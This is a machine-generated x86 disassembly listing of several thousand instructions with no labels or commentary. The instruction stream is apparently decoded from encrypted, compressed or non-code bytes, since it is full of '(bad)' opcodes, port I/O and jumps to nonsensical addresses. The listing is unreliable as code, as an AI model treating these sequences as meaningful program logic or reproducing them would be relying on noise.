  4149db:	sbb    DWORD PTR [ebx+0x4],eax
  4149de:	push   es
  4149df:	xor    eax,0x9de322c0
  4149e4:	add    cl,BYTE PTR [ecx+0x446584f4]
  4149ea:	xor    BYTE PTR [edx],cl
  4149ec:	sub    DWORD PTR ds:0x48339d5e,edx
  4149f2:	xor    cl,BYTE PTR [eax]
  4149f4:	jle    0x414a31
  4149f6:	sub    eax,0x88fb12a5
  4149fb:	xchg   esp,eax
  4149fc:	in     eax,0x4e
  4149fe:	fst    DWORD PTR [ecx+0x26]
  414a01:	shl    BYTE PTR [ebx],0xab
  414a04:	ror    DWORD PTR [ecx+0x66],1
  414a07:	rcr    BYTE PTR [edx+0x4771046e],cl
  414a0d:	xchg   esp,eax
  414a0e:	dec    esp
  414a0f:	mov    esi,0xc1b99997
  414a14:	int    0x86
  414a16:	xchg   ecx,eax
  414a17:	(bad)  
  414a18:	or     BYTE PTR [esi],ah
  414a1a:	mov    ch,0x21
  414a1c:	aam    0xa4
  414a1e:	pop    ds
  414a1f:	mov    esi,DWORD PTR [edx+eax*1+0x7a]
  414a23:	adc    ecx,DWORD PTR [ebx]
  414a25:	(bad)  
  414a26:	sbb    al,0x61
  414a28:	(bad)  
  414a29:	retf   0xf91a
  414a2c:	pop    ds
  414a2d:	loope  0x414a68
  414a2f:	pop    ds
  414a30:	fwait
  414a31:	(bad)  
  414a32:	xadd   DWORD PTR [ecx+edx*8],edi
  414a36:	mov    ebp,0x9e95870e
  414a3b:	push   esp
  414a3c:	(bad)  
  414a3d:	cmp    cl,BYTE PTR [ebp+0x54288e8e]
  414a43:	cmp    al,BYTE PTR [edx+0xa]
  414a46:	dec    edi
  414a47:	retf   
  414a48:	mov    eax,ds:0x2c849ca9
  414a4d:	dec    ebp
  414a4e:	sbb    ah,al
  414a50:	pop    ebx
  414a51:	rol    DWORD PTR [eax],cl
  414a53:	in     eax,dx
  414a54:	jg     0x414ab0
  414a56:	mov    eax,ds:0x32bd16f1
  414a5b:	xchg   ecx,eax
  414a5c:	std    
  414a5d:	sub    DWORD PTR [ebx-0x12],edi
  414a60:	pop    eax
  414a61:	pushf  
  414a62:	mov    edi,0x223d03c7
  414a67:	cld    
  414a68:	jge    0x414a3b
  414a6a:	cmp    ecx,ebp
  414a6c:	and    BYTE PTR [edx-0x3],cl
  414a6f:	cwde   
  414a70:	and    al,0x97
  414a72:	pop    eax
  414a73:	xlat   BYTE PTR ds:[ebx]
  414a74:	(bad)  
  414a75:	ds icebp 
  414a77:	pop    eax
  414a78:	and    al,0x70
  414a7a:	xor    DWORD PTR [esi],esp
  414a7c:	mov    esi,0x959c708
  414a81:	imul   eax,edx,0x41
  414a84:	dec    edi
  414a85:	arpl   WORD PTR gs:[esi],bp
  414a88:	mov    ecx,0xb7d33be2
  414a8d:	mov    ds:0xb0ea4014,al
  414a92:	fcompp 
  414a94:	push   edx
  414a95:	mov    eax,ds:0x7a49df8b
  414a9a:	pusha  
  414a9b:	ins    DWORD PTR es:[edi],dx
  414a9c:	push   ebx
  414a9d:	ret    
  414a9e:	mov    ah,0xf6
  414aa0:	pusha  
  414aa1:	mov    al,0x26
  414aa3:	inc    edi
  414aa4:	(bad)  
  414aa5:	scas   eax,DWORD PTR es:[edi]
  414aa6:	sub    BYTE PTR [ebp+0x6b],ah
  414aa9:	mov    edi,esi
  414aab:	mov    ebp,DWORD PTR [ebx]
  414aad:	bound  ecx,QWORD PTR [edx]
  414aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ab0:	pusha  
  414ab1:	scas   al,BYTE PTR es:[edi]
  414ab2:	test   DWORD PTR [eax-0x7f],ecx
  414ab5:	das    
  414ab6:	sbb    al,0xa3
  414ab8:	push   ebx
  414ab9:	jno    0x414add
  414abb:	ins    BYTE PTR es:[edi],dx
  414abc:	mov    ch,0xd3
  414abe:	shl    BYTE PTR [ebp-0x72],0x96
  414ac2:	int    0x1a
  414ac4:	dec    ebx
  414ac5:	popf   
  414ac6:	sbb    edi,DWORD PTR [esp+0x58]
  414aca:	outs   dx,DWORD PTR ds:[esi]
  414acb:	xlat   BYTE PTR ds:[ebx]
  414acc:	xor    BYTE PTR [edx],dh
  414ace:	sbb    bl,BYTE PTR [edx+eax*4+0x27fb4634]
  414ad5:	outs   dx,BYTE PTR ds:[esi]
  414ad6:	icebp  
  414ad7:	pushf  
  414ad8:	into   
  414ad9:	inc    ebx
  414ada:	fstp   DWORD PTR [ecx+esi*8+0xff294da]
  414ae1:	in     al,dx
  414ae2:	or     bh,BYTE PTR [ebx]
  414ae4:	rcr    DWORD PTR [esp+edx*4],0x5e
  414ae8:	fistp  QWORD PTR [eax]
  414aea:	cmp    ch,bh
  414aec:	into   
  414aed:	mov    dh,0x4f
  414aef:	xor    esi,DWORD PTR [ecx+0x4d]
  414af2:	pop    ss
  414af3:	out    dx,al
  414af4:	out    0x60,eax
  414af6:	out    dx,eax
  414af7:	fstp   QWORD PTR [edi+eax*4+0x198527f6]
  414afe:	pop    edx
  414aff:	push   0xffffffa3
  414b01:	clc    
  414b02:	(bad)  
  414b04:	mov    ebx,0x5cd8f900
  414b09:	push   0xf7261712
  414b0e:	pop    eax
  414b0f:	inc    esp
  414b10:	push   edx
  414b11:	xchg   edx,eax
  414b12:	out    0x87,al
  414b14:	(bad)  
  414b15:	call   0xcbc3c523
  414b1a:	xchg   esp,eax
  414b1b:	daa    
  414b1c:	fnstsw WORD PTR [esp+eax*1]
  414b1f:	shl    DWORD PTR [eax+0x3bff937e],0x7a
  414b26:	jmp    0x923dac6c
  414b2b:	xor    eax,0x7f45a0e4
  414b30:	mov    ebp,0xca638c5c
  414b35:	jne    0x414b82
  414b37:	or     eax,0x89c9ebb
  414b3c:	adc    al,0x87
  414b3e:	pop    ebx
  414b3f:	in     al,0xeb
  414b41:	packssdw mm7,mm6
  414b44:	jb     0x414ae5
  414b46:	cmc    
  414b47:	sbb    BYTE PTR [ebp+0x5b],bh
  414b4a:	jl     0x414b5b
  414b4c:	fistp  WORD PTR [ebx-0x721837e4]
  414b52:	jp     0x414bcc
  414b54:	push   ecx
  414b55:	cli    
  414b56:	inc    esp
  414b57:	mov    eax,0x830608e5
  414b5c:	daa    
  414b5d:	ss jl  0x414b8d
  414b60:	mov    dh,0x42
  414b62:	pop    esi
  414b63:	fdivr  DWORD PTR [ecx-0x17]
  414b66:	mov    cl,0xb5
  414b68:	sub    eax,0x99a43c0b
  414b6d:	aad    0x34
  414b6f:	cmp    DWORD PTR [ebx-0x2a],ebp
  414b72:	push   0x28
  414b74:	(bad)  fs:[ebx]
  414b77:	loopne 0x414bc3
  414b79:	or     si,di
  414b7c:	mov    ah,0x82
  414b7e:	ret    0x1c19
  414b81:	rol    BYTE PTR [ebx+0x72292c72],1
  414b87:	dec    ebp
  414b88:	jbe    0x414bb5
  414b8a:	arpl   WORD PTR [eax-0x4a30d3e7],bp
  414b90:	pop    eax
  414b91:	mov    ebp,0x987a9d12
  414b96:	jo     0x414ba2
  414b98:	adc    DWORD PTR [ecx+0x7c],edi
  414b9b:	push   ss
  414b9c:	adc    ch,BYTE PTR [edi+0x52acead6]
  414ba2:	pop    eax
  414ba3:	test   DWORD PTR ds:0xddb89a93,0xbe9b25b2
  414bad:	jno    0x414c0e
  414baf:	ss test eax,0x87dbc1d7
  414bb5:	pop    esi
  414bb6:	jge    0x414bfd
  414bb8:	or     ebp,DWORD PTR [ebp+0x6c]
  414bbb:	adc    eax,0x467c7eef
  414bc0:	xor    cl,ch
  414bc2:	add    DWORD PTR [edi+0x6c182dc2],esi
  414bc8:	jle    0x414b67
  414bca:	push   ebx
  414bcb:	and    al,0xd8
  414bcd:	hlt    
  414bce:	dec    ebp
  414bcf:	or     al,0xda
  414bd1:	xchg   esp,eax
  414bd2:	push   es
  414bd3:	mov    ebx,DWORD PTR [ecx+0x285254cf]
  414bd9:	sub    BYTE PTR [eax-0x6c],bl
  414bdc:	pop    edx
  414bdd:	jbe    0x414c2e
  414bdf:	das    
  414be0:	mov    al,ds:0xb2d29c1d
  414be5:	in     eax,0x4d
  414be7:	cli    
  414be8:	cli    
  414be9:	pop    eax
  414bea:	sub    eax,0x38d67bc3
  414bef:	fsubr  DWORD PTR [edi+0x3cbdec23]
  414bf5:	inc    esp
  414bf6:	jmp    0x4683:0xe0e5e81c
  414bfd:	xor    ebx,ebx
  414bff:	jmp    0x9f95e991
  414c04:	(bad)  
  414c05:	xor    BYTE PTR [ecx-0x1fbfef9b],bl
  414c0b:	mov    bh,0xee
  414c0d:	fisub  DWORD PTR [edx]
  414c0f:	sbb    DWORD PTR [ebx-0x20],0xfffffff4
  414c13:	xlat   BYTE PTR ds:[ebx]
  414c14:	inc    ebp
  414c15:	imul   ebp,DWORD PTR [edi+0x2a],0xfa508742
  414c1c:	mov    bh,0x4b
  414c1e:	scas   al,BYTE PTR es:[edi]
  414c1f:	adc    al,0x1c
  414c21:	mov    ?,WORD PTR [esi]
  414c23:	lods   al,BYTE PTR ds:[esi]
  414c24:	jg     0x414c72
  414c26:	adc    dh,BYTE PTR [esi+0x4b]
  414c29:	fimul  DWORD PTR [ebp+0x5c]
  414c2c:	mov    ecx,0xacee5873
  414c31:	xor    al,0x59
  414c33:	jl     0x414bfb
  414c35:	sbb    DWORD PTR [ecx+0x3f],ebx
  414c38:	loope  0x414c2e
  414c3a:	retf   
  414c3b:	aam    0x2c
  414c3d:	rol    BYTE PTR [esi-0x5a788af3],0x74
  414c44:	mov    al,BYTE PTR [esi+ebx*1-0x79]
  414c48:	cwde   
  414c49:	inc    ecx
  414c4a:	mov    DWORD PTR [ebx-0x11],ecx
  414c4d:	gs mov dh,0xf
  414c50:	push   ds
  414c51:	push   ss
  414c52:	enter  0x60fe,0x37
  414c56:	shl    BYTE PTR [ebx-0x1ef7161b],0x8f
  414c5d:	loop   0x414c93
  414c5f:	sbb    edx,ecx
  414c61:	mov    es,WORD PTR [esi-0x4f20147a]
  414c67:	stos   BYTE PTR es:[edi],al
  414c68:	sub    ebx,edx
  414c6a:	stc    
  414c6b:	cmp    bl,0x96
  414c6e:	push   edi
  414c6f:	cmp    DWORD PTR [eax-0x3a2677ee],esp
  414c75:	inc    ebp
  414c76:	pop    edx
  414c77:	xchg   DWORD PTR [eax-0x52],edx
  414c7a:	add    edi,DWORD PTR [esp+edi*8]
  414c7d:	mov    esp,0x17198bdc
  414c82:	inc    ebp
  414c83:	adc    bh,bl
  414c85:	add    BYTE PTR [ebx+0x60e74304],0x6e
  414c8c:	nop
  414c8d:	lods   eax,DWORD PTR ds:[esi]
  414c8e:	mov    cl,0x4e
  414c91:	fadd   DWORD PTR [edx]
  414c93:	and    al,0xc0
  414c95:	add    al,0xde
  414c97:	scas   eax,DWORD PTR es:[edi]
  414c98:	mov    cl,0xb2
  414c9a:	out    0x19,eax
  414c9c:	enter  0x479,0x18
  414ca0:	shr    ebx,0x95
  414ca3:	ss xor bl,0xd5
  414ca7:	pop    eax
  414ca8:	jge    0x414cf0
  414caa:	adc    BYTE PTR [edi-0xa],bh
  414cad:	sbb    eax,0xb444b743
  414cb2:	aam    0x3f
  414cb4:	sbb    BYTE PTR [edx+0x30],ch
  414cb7:	es dec edx
  414cb9:	clc    
  414cba:	nop
  414cbb:	inc    esi
  414cbc:	sbb    bh,bl
  414cbe:	ds pop ss
  414cc0:	fs (bad) 
  414cc2:	cs pop ds
  414cc4:	jg     0x414cbd
  414cc6:	or     esi,DWORD PTR [esi+0x76e33874]
  414ccc:	jle    0x414c96
  414cce:	xchg   edi,eax
  414ccf:	jle    0x414d2f
  414cd1:	and    eax,0x6b693a09
  414cd6:	jmp    0x414d39
  414cd8:	pop    ebp
  414cd9:	xlat   BYTE PTR ds:[ebx]
  414cda:	cli    
  414cdb:	fnstsw ax
  414cdd:	sti    
  414cde:	push   0xbf11bc13
  414ce3:	jl     0x414cf1
  414ce5:	popa   
  414ce6:	ins    DWORD PTR es:[edi],dx
  414ce7:	scas   eax,DWORD PTR es:[edi]
  414ce8:	(bad)  
  414ce9:	test   DWORD PTR [ecx-0x63],ebp
  414cec:	sbb    dl,BYTE PTR [edx+0x1105f536]
  414cf2:	cmp    eax,0x9102d7f3
  414cf7:	and    DWORD PTR [ecx-0x6a23bc5],ecx
  414cfd:	cwde   
  414cfe:	aam    0x12
  414d00:	mov    eax,ds:0x91836fab
  414d05:	and    eax,0xf78083cc
  414d0a:	in     al,0xc
  414d0c:	lods   al,BYTE PTR ds:[esi]
  414d0d:	adc    edi,DWORD PTR [esi+ecx*8]
  414d10:	xor    edi,DWORD PTR [eax+esi*1]
  414d13:	test   eax,0xf567737e
  414d18:	mov    esi,0x6a3986cc
  414d1d:	call   0x6586:0x11cf7e7f
  414d24:	out    dx,eax
  414d25:	(bad)  
  414d26:	mov    al,ds:0x5e73c30a
  414d2b:	(bad)  
  414d2c:	loopne 0x414cec
  414d2e:	cmc    
  414d2f:	std    
  414d30:	scas   eax,DWORD PTR es:[edi]
  414d31:	pop    edi
  414d32:	aad    0xe2
  414d34:	push   ebp
  414d35:	in     eax,0xae
  414d37:	repnz leave 
  414d39:	push   es
  414d3a:	stc    
  414d3b:	enter  0xd3b8,0xae
  414d3f:	sub    DWORD PTR [ebp+0x13],ebx
  414d42:	mov    gs,WORD PTR [edi+0x27f35053]
  414d48:	or     DWORD PTR [edx-0xd],ebp
  414d4b:	xchg   ebx,eax
  414d4c:	jmp    0xc941d134
  414d51:	shl    BYTE PTR [edx],1
  414d53:	mov    dl,0x9c
  414d55:	inc    esi
  414d56:	rcr    BYTE PTR [ecx],0x9
  414d59:	adc    DWORD PTR [ebx],0xffffffed
  414d5c:	jbe    0x414d44
  414d5e:	push   ebx
  414d5f:	jae    0x414d8c
  414d61:	push   ds
  414d62:	jno    0x414dd8
  414d64:	mov    al,0x6b
  414d66:	mov    edx,DWORD PTR [ebx+ebp*8]
  414d69:	xor    ah,BYTE PTR [esi]
  414d6b:	out    dx,eax
  414d6c:	push   edi
  414d6d:	jae    0x414d56
  414d6f:	lea    edi,[ecx]
  414d71:	dec    ebx
  414d72:	xchg   ebx,eax
  414d73:	and    al,0x7c
  414d75:	sub    al,BYTE PTR [ecx-0x33]
  414d78:	in     eax,dx
  414d79:	dec    esp
  414d7a:	push   ebp
  414d7b:	mov    ds:0x595b60f0,eax
  414d80:	shl    BYTE PTR [esi],1
  414d82:	dec    dl
  414d84:	jmp    0x414e03
  414d86:	leave  
  414d87:	repz xor al,dl
  414d8a:	aam    0x9e
  414d8c:	aaa    
  414d8d:	stos   DWORD PTR es:[edi],eax
  414d8e:	sti    
  414d8f:	push   eax
  414d90:	pop    ebp
  414d91:	fild   DWORD PTR [eax]
  414d93:	neg    ebp
  414d95:	add    al,0x2b
  414d97:	xor    edi,ebp
  414d99:	push   es
  414d9a:	and    al,0x28
  414d9c:	jmp    0x414e0f
  414d9e:	xchg   edx,eax
  414d9f:	jno    0x414db1
  414da1:	xlat   BYTE PTR ds:[ebx]
  414da2:	jae    0x414d86
  414da4:	lea    esi,gs:[ebx]
  414da7:	les    ecx,FWORD PTR [edi-0x6fb0a3f6]
  414dad:	mov    edx,0x1cd4ddb3
  414db2:	jecxz  0x414dea
  414db4:	sbb    al,0x76
  414db6:	or     esi,DWORD PTR [edi+esi*2-0x6f]
  414dba:	jnp    0x414d86
  414dbc:	stos   DWORD PTR es:[edi],eax
  414dbd:	mov    ecx,0xa55c07
  414dc2:	push   ebx
  414dc3:	pop    esi
  414dc4:	jmp    0x414ded
  414dc6:	dec    ebx
  414dc7:	push   edx
  414dc8:	idiv   BYTE PTR [ebp+0x6c]
  414dcb:	in     al,0x5
  414dcd:	fbld   TBYTE PTR [edi+ebx*2-0x3b]
  414dd1:	mov    DWORD PTR [ecx-0x7a],ebp
  414dd4:	adc    eax,0x31df4a29
  414dd9:	xchg   edi,eax
  414dda:	out    dx,eax
  414ddb:	sub    al,0x9e
  414ddd:	adc    dl,dh
  414ddf:	cmp    eax,0xe276d594
  414de4:	adc    DWORD PTR [ebx-0x1b],0xffffffec
  414de8:	push   edi
  414de9:	stos   DWORD PTR es:[edi],eax
  414dea:	in     eax,0x6
  414dec:	jecxz  0x414df6
  414dee:	imul   DWORD PTR [eax+0x4b]
  414df1:	pop    ebp
  414df2:	push   ebp
  414df3:	cmp    al,0x49
  414df5:	push   edx
  414df6:	test   DWORD PTR [esi],edi
  414df8:	pop    ecx
  414df9:	push   0xaa2db5ac
  414dfe:	add    eax,0xc71701cb
  414e03:	scas   eax,DWORD PTR es:[edi]
  414e04:	lds    ebx,FWORD PTR [edi+0x2bee0377]
  414e0a:	add    dh,ah
  414e0c:	sbb    ch,dh
  414e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e0f:	and    bh,BYTE PTR [edx+ebp*8-0x1206e6de]
  414e16:	fs test al,0xa8
  414e19:	inc    eax
  414e1a:	sub    eax,edi
  414e1c:	xchg   ecx,eax
  414e1d:	xor    esp,DWORD PTR [esi]
  414e1f:	imul   ecx,DWORD PTR [ecx],0xc5b2e20
  414e25:	fadd   DWORD PTR [esi-0x1b05ae26]
  414e2b:	and    eax,0xc627ab65
  414e30:	xor    ebx,DWORD PTR [edi-0x329a5193]
  414e36:	pop    ebp
  414e37:	(bad)  
  414e38:	in     al,dx
  414e39:	pop    edi
  414e3a:	ss test al,0x42
  414e3d:	push   cs
  414e3e:	ins    DWORD PTR es:[edi],dx
  414e3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e40:	jo     0x414e35
  414e42:	nop
  414e43:	sti    
  414e44:	push   0x9e66261d
  414e49:	shl    BYTE PTR [ebx],1
  414e4b:	fwait
  414e4c:	mov    bl,0xed
  414e4e:	or     BYTE PTR [edx+0x3e],cl
  414e51:	div    DWORD PTR [ebp-0x689e6c19]
  414e57:	mov    WORD PTR [esp+edi*1-0x38f5202f],es
  414e5e:	sti    
  414e5f:	popf   
  414e60:	sub    bh,BYTE PTR ds:0xa8e1eac6
  414e66:	push   esi
  414e67:	call   0xc32164bd
  414e6c:	cmp    al,0x7b
  414e6e:	js     0x414e52
  414e70:	sub    eax,0xa6d5179d
  414e75:	jmp    0x414edf
  414e77:	mov    bh,0x79
  414e79:	push   es
  414e7a:	out    0xd1,eax
  414e7c:	dec    edx
  414e7d:	pavgb  mm0,QWORD PTR [edi+ecx*4]
  414e81:	aam    0xdb
  414e83:	jmp    FWORD PTR [ecx-0x69]
  414e86:	mov    ebx,es
  414e88:	rol    esi,0x88
  414e8b:	lds    edx,FWORD PTR [edi+0x2a3747b5]
  414e91:	lds    ecx,FWORD PTR [eax]
  414e93:	xor    ebp,DWORD PTR [ecx+esi*8]
  414e96:	ja     0x414e75
  414e98:	inc    esp
  414e99:	cmc    
  414e9a:	push   ebp
  414e9b:	adc    DWORD PTR [edi+edi*1],ecx
  414e9e:	(bad)  
  414ea0:	retf   
  414ea1:	push   edi
  414ea2:	repz test edi,esi
  414ea5:	mov    ah,0x4c
  414ea7:	arpl   WORD PTR [ebx+0x5c],bx
  414eaa:	xchg   esp,eax
  414eab:	mov    cl,0x2
  414ead:	stos   DWORD PTR es:[edi],eax
  414eae:	popa   
  414eaf:	mov    esi,esi
  414eb1:	sub    ebp,ebx
  414eb3:	lock enter 0x767e,0x5c
  414eb8:	push   esp
  414eb9:	xor    al,0x45
  414ebb:	inc    esp
  414ebc:	cmc    
  414ebd:	outs   dx,BYTE PTR ds:[esi]
  414ebe:	adc    eax,0xb61c63af
  414ec3:	aas    
  414ec4:	add    BYTE PTR [esi-0x6c],ah
  414ec7:	xchg   ecx,eax
  414ec8:	xchg   ebx,eax
  414ec9:	(bad)  
  414eca:	aam    0x72
  414ecc:	xchg   BYTE PTR [edi+edx*4-0xb9714b4],dh
  414ed3:	adc    eax,0xc4e19913
  414ed8:	std    
  414ed9:	pushf  
  414eda:	into   
  414edb:	push   ebp
  414edc:	adc    ebp,DWORD PTR [edx-0x5af7eb29]
  414ee2:	add    ch,BYTE PTR [edi+0x59]
  414ee5:	dec    eax
  414ee6:	lds    esp,FWORD PTR [eax]
  414ee8:	data16 loope 0x414f26
  414eeb:	cs mov dl,0x56
  414eee:	ret    0x8c10
  414ef1:	xor    DWORD PTR ds:0x761ff415,ebx
  414ef7:	jb     0x414f6a
  414ef9:	loop   0x414f01
  414efb:	test   DWORD PTR [edx+0x1],0x8a8b95b3
  414f02:	xchg   DWORD PTR [eax-0x49],esp
  414f05:	(bad)  
  414f06:	lods   eax,DWORD PTR ds:[esi]
  414f07:	push   ebp
  414f08:	pop    si
  414f0a:	jo     0x414f7c
  414f0c:	fld    TBYTE PTR ss:[ebp+0x1c]
  414f10:	xchg   esp,eax
  414f11:	or     DWORD PTR [eax],ebp
  414f13:	hlt    
  414f14:	ret    0x49e7
  414f17:	add    al,0x12
  414f19:	pop    eax
  414f1a:	js     0x414f2f
  414f1c:	pop    esi
  414f1d:	addr16 pop eax
  414f1f:	test   BYTE PTR ds:[ebx],0x95
  414f23:	retf   0x79c5
  414f26:	mov    ch,0x7b
  414f28:	pop    ebp
  414f29:	cmp    esi,esi
  414f2b:	lods   eax,DWORD PTR ds:[esi]
  414f2c:	inc    esi
  414f2d:	or     eax,0xa8e498d2
  414f32:	aad    0xb7
  414f34:	push   edi
  414f35:	sar    BYTE PTR [ebp+eiz*2+0x465761cc],0x70
  414f3d:	xchg   ebx,eax
  414f3e:	les    ebx,FWORD PTR [edi-0x108e625f]
  414f44:	inc    BYTE PTR [ecx+ebp*8+0x63]
  414f48:	ja     0x414f62
  414f4a:	addr16 rcr dl,0x9b
  414f4e:	loop   0x414f89
  414f50:	bound  eax,QWORD PTR [ebx+ebx*4]
  414f53:	add    BYTE PTR [esi+0x6d],bl
  414f56:	loop   0x414f72
  414f58:	mov    ebx,0x69d4f1b1
  414f5d:	jge    0x414fd3
  414f5f:	je     0x414f48
  414f61:	mov    cl,0x28
  414f63:	inc    esp
  414f64:	fisub  WORD PTR [edx+0x2b8bcb6f]
  414f6a:	dec    edi
  414f6b:	mov    bl,0x91
  414f6d:	mov    bl,ch
  414f6f:	fdivr  st,st(3)
  414f71:	loop   0x414f69
  414f73:	ins    DWORD PTR es:[edi],dx
  414f74:	cld    
  414f75:	vsqrtss xmm2,xmm5,DWORD PTR [ebx]
  414f79:	xchg   BYTE PTR [ebx],bl
  414f7b:	cli    
  414f7c:	je     0x414fba
  414f7e:	push   esp
  414f7f:	dec    edx
  414f80:	std    
  414f81:	scas   eax,DWORD PTR es:[edi]
  414f82:	fs xor al,0x2a
  414f85:	call   0x6db7875f
  414f8a:	mov    al,ds:0x7186ddd3
  414f8f:	loop   0x414f65
  414f91:	ds jbe 0x414fe0
  414f94:	or     ebp,esi
  414f96:	clc    
  414f97:	into   
  414f98:	mov    ebx,DWORD PTR [edi]
  414f9a:	sti    
  414f9b:	loopne 0x414f46
  414f9d:	xchg   ebx,eax
  414f9e:	xchg   esi,eax
  414f9f:	push   edi
  414fa0:	inc    eax
  414fa1:	(bad)  
  414fa2:	jp     0x414ff5
  414fa4:	cmc    
  414fa5:	aaa    
  414fa6:	jecxz  0x41501d
  414fa8:	mov    ebx,0xf7661682
  414fad:	jo     0x41501e
  414faf:	mov    cl,0xa1
  414fb1:	or     al,bh
  414fb3:	pop    ecx
  414fb4:	test   BYTE PTR [ecx-0x7d4ef05d],cl
  414fba:	pushf  
  414fbb:	push   eax
  414fbc:	xchg   edi,eax
  414fbd:	lahf   
  414fbe:	mov    bh,0x77
  414fc0:	jnp    0x414fa0
  414fc2:	imul   ebp,eax,0xa86f6839
  414fc8:	pop    esp
  414fc9:	lock jmp edi
  414fcc:	cs test al,0xa8
  414fcf:	js     0x415011
  414fd1:	mov    ebp,gs
  414fd3:	or     DWORD PTR [esi+0x58655f78],esi
  414fd9:	shr    BYTE PTR [ebx],cl
  414fdb:	cmp    edi,ecx
  414fdd:	mov    edi,DWORD PTR [esi]
  414fdf:	xor    DWORD PTR [esi],ecx
  414fe1:	test   eax,ebp
  414fe3:	lods   eax,DWORD PTR ds:[esi]
  414fe4:	cdq    
  414fe5:	jmp    0x414fbd
  414fe7:	or     BYTE PTR [ecx],ah
  414fe9:	ds icebp 
  414feb:	repnz or BYTE PTR [edi+esi*2+0x6c964192],al
  414ff3:	jno    0x414fad
  414ff5:	rol    ecx,0xfa
  414ff8:	adc    esi,DWORD PTR [edi+0x61]
  414ffb:	int    0xc5
  414ffd:	cs (bad) 
  414fff:	jmp    0xdcffbe1e
  415004:	push   0xffffffee
  415006:	bound  edi,QWORD PTR [esi-0x6]
  415009:	or     eax,0x16cf8720
  41500e:	mov    ebp,0x856c215e
  415013:	cmp    eax,0x89c512cd
  415018:	mov    dh,0xaa
  41501a:	scas   al,BYTE PTR es:[edi]
  41501b:	repz jae 0x415093
  41501e:	test   al,0xac
  415020:	and    BYTE PTR [ebx+edx*8+0x6029d56e],dl
  415027:	loopne 0x414ffe
  415029:	sub    dh,BYTE PTR [edx+edx*8]
  41502c:	push   ss
  41502d:	adc    edx,eax
  41502f:	icebp  
  415030:	out    dx,al
  415031:	xchg   ebp,eax
  415032:	cmp    bh,BYTE PTR [edi+ecx*2+0xd]
  415036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415037:	popf   
  415038:	fmul   QWORD PTR [esi+0x63dab49d]
  41503e:	ret    0xa5b3
  415041:	cwde   
  415042:	and    ch,bh
  415044:	push   ebx
  415045:	xchg   DWORD PTR [ebp+0x4f],edi
  415048:	lods   al,BYTE PTR ds:[esi]
  415049:	sub    edx,eax
  41504b:	cdq    
  41504c:	jge    0x415074
  41504e:	xchg   esi,eax
  41504f:	int3   
  415050:	inc    ecx
  415051:	pop    edi
  415052:	lahf   
  415053:	xchg   ebp,eax
  415054:	push   ebx
  415055:	dec    esi
  415056:	popf   
  415057:	loopne 0x41508f
  415059:	xchg   DWORD PTR [ecx],ebx
  41505b:	pop    edi
  41505c:	in     al,0x44
  41505e:	out    dx,eax
  41505f:	jecxz  0x4150df
  415061:	xor    al,0x2e
  415063:	sbb    al,0xa5
  415065:	ds mov ds,ebx
  415068:	and    bl,cl
  41506a:	and    eax,DWORD PTR [edx]
  41506c:	add    DWORD PTR [edi+0x7b],0x19c6043f
  415073:	inc    eax
  415074:	aad    0xf7
  415076:	icebp  
  415077:	sub    al,0x69
  415079:	loop   0x415049
  41507b:	adc    edx,DWORD PTR [esi+edx*8]
  41507e:	or     eax,0xe3cba666
  415083:	js     0x4150bf
  415085:	adc    esp,esp
  415087:	neg    DWORD PTR [esi+0x13]
  41508a:	cmp    cl,BYTE PTR [ebx]
  41508c:	xor    BYTE PTR [edi],bh
  41508e:	sub    al,ch
  415090:	inc    edi
  415091:	mov    cl,0x56
  415093:	mov    ah,0x99
  415095:	les    esp,FWORD PTR [eax]
  415097:	ret    
  415098:	and    al,0x3f
  41509a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41509b:	cld    
  41509c:	sahf   
  41509d:	cmp    ah,BYTE PTR [edx+ebp*2-0x6e]
  4150a1:	enter  0x99fd,0xf8
  4150a5:	push   cs
  4150a6:	sahf   
  4150a7:	or     eax,0xe97327ca
  4150ac:	fidiv  DWORD PTR [esi+ecx*8]
  4150af:	imul   ebx,DWORD PTR [ecx+0x48],0xffffff9b
  4150b3:	mov    esp,0x165f769e
  4150b8:	xor    bl,BYTE PTR [ebx+0x4d]
  4150bb:	pop    esp
  4150bc:	out    dx,eax
  4150bd:	leave  
  4150be:	inc    edx
  4150bf:	pop    edi
  4150c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150c2:	outs   dx,DWORD PTR ds:[esi]
  4150c3:	out    0xca,al
  4150c5:	popa   
  4150c6:	mov    esp,0xbe2a2970
  4150cb:	jns    0x415086
  4150cd:	adc    al,0xb
  4150cf:	adc    eax,0x2287ed7
  4150d4:	nop
  4150d5:	xlat   BYTE PTR ss:[ebx]
  4150d7:	jne    0x415107
  4150d9:	scas   eax,DWORD PTR es:[edi]
  4150da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150db:	inc    edx
  4150dc:	dec    edx
  4150dd:	or     bh,BYTE PTR [ebp-0x3fbdbab]
  4150e3:	adc    DWORD PTR [esi+0x48dd501f],ecx
  4150e9:	sahf   
  4150ea:	aad    0xa2
  4150ec:	dec    ebx
  4150ed:	jno    0x415102
  4150ef:	lods   al,BYTE PTR ds:[esi]
  4150f0:	sub    DWORD PTR [edi],eax
  4150f2:	out    dx,al
  4150f3:	sbb    DWORD PTR [esi],0xffffff82
  4150f6:	cld    
  4150f7:	mov    al,BYTE PTR [ecx]
  4150f9:	fbstp  TBYTE PTR [edi+0x75d7ae91]
  4150ff:	cmp    eax,0x19fd1eaf
  415104:	pusha  
  415105:	mov    al,ds:0x733853db
  41510a:	iret   
  41510b:	cmp    BYTE PTR [edi+0x24fd5e17],dh
  415111:	jg     0x4150a5
  415113:	jne    0x415193
  415115:	sbb    dh,ch
  415117:	pop    esp
  415118:	inc    edx
  415119:	mov    ebx,0x35ac1625
  41511e:	rcr    DWORD PTR [edi-0x1d],cl
  415121:	cmp    cl,BYTE PTR [edi-0xad20595]
  415127:	cmp    DWORD PTR [ebx+edx*2+0x1c76b2f3],ebp
  41512e:	push   esi
  41512f:	pop    ebp
  415130:	jl     0x4151ae
  415132:	pop    es
  415133:	es add al,0xae
  415136:	add    al,0x81
  415138:	dec    eax
  415139:	push   ss
  41513a:	setne  BYTE PTR [edx]
  41513d:	call   0x527a:0x51d60df4
  415144:	dec    edx
  415145:	dec    eax
  415146:	cmp    eax,0xed6b4f28
